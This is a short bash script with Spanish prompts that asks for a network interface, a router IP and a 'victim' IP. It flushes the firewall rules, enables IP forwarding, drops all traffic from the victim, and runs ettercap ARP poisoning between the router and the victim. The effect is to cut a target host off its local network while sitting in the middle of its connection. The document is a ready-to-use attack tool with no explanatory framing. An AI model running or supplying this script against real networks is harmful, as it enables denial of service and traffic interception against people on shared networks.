#!/bin/bash
echo -n "Interfaz a utilizar: "
read -e IFACE
echo -n "IP Router: "
read -e ROUTER
echo -n "IP Victima: "
read -e VICTIMA
iptables --flush
iptables --table nat --flush
iptables --delete-chain
iptables --table nat --delete-chain
echo 1 > /proc/sys/net/ipv4/ip_forward
iptables -I INPUT -s $VICTIMA -j DROP
iptables -I FORWARD -s $VICTIMA -j DROP
iptables -I OUTPUT -s $VICTIMA -j DROP
ettercap -T -q -i $IFACE -M arp:remote /$ROUTER// /$VICTIMA//
iptables --flush
iptables --table nat --flush
iptables --delete-chain
iptables --table nat --delete-chain